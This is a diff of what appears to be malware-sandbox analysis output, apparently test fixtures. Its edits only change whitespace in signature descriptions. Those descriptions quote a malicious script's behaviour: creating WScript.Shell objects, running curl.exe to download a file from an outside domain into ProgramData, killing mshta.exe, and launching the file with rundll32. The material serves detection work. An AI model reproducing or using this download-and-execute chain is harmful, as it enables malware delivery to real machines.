@@ -93,7 +93,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: WScript.Shell\n\n\t\tActiveXObject(WScript.Shell)\n\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tActiveXObject(wscript.shell)\n\n\t\tActiveXObject(shell.application)\n\n\t\tvar axqKhseWy = new ActiveXObject('WScript.Shell')",
+        "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: WScript.Shell\n\t\tActiveXObject(WScript.Shell)\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tActiveXObject(wscript.shell)\n\t\tActiveXObject(shell.application)\n\t\tvar axqKhseWy = new ActiveXObject('WScript.Shell')",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -117,7 +117,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[20]()\n\n\t\tnew WScript.Shell[22]()\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[20]()\n\t\tnew WScript.Shell[22]()",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -141,7 +141,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[22].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[22].run(\"taskkill /f /im mshta.exe\", 0)\n",
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[22].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[22].run(\"taskkill /f /im mshta.exe\", 0)",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -165,7 +165,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[22].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[22].run(\"taskkill /f /im mshta.exe\", 0)\n",
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[22].run(\"curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gi...\n\t\tWScript.Shell[22].run(\"taskkill /f /im mshta.exe\", 0)",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -189,7 +189,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[23].shellexecute(\"rundll32\", \"C:\\ProgramData\\aj0iG.png,Wind\", \"\", \"open\", 3)\n",
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[23].shellexecute(\"rundll32\", \"C:\\ProgramData\\aj0iG.png,Wind\", \"\", \"open\", 3)",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
